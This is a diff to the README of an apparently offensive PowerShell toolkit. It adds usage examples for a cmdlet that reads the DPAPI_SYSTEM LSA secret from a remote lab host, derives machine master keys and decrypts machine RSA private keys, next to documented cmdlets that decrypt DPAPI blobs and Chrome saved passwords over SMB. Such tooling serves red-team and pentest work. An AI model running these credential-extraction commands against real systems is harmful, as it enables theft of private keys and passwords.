@@ -550,6 +550,23 @@ Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -Path $blob.Pat
 Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -RegistryPath HKLM\Software\Contoso -ValueName Blob -MasterKey $mk.MasterKey
 ```
 
+#### Get-TBOMachineCertificates
+
+Enumerates machine RSA private keys (CAPI and CNG), decrypts the DPAPI-protected key material using machine master keys, and attempts to map recovered keys to LocalMachine\My certificates by matching the RSA modulus.
+By default, only keys that match a certificate are returned. Use `-ShowAll` to return all recovered keys and decrypt failures.
+
+```powershell
+$keys = Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name DPAPI_SYSTEM |
+  Get-TBODpapiMasterKeys -Scope Machine
+Get-TBOMachineCertificates -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $keys
+
+# Include unmatched keys and failures
+Get-TBOMachineCertificates -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $keys -ShowAll
+
+# Skip CNG keys (only scan CAPI MachineKeys)
+Get-TBOMachineCertificates -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $keys -SkipCng
+```
+
 #### Get-TBOChromeLogins
 
 Reads Chrome's Login Data SQLite database for user profiles over SMB and decrypts saved passwords.
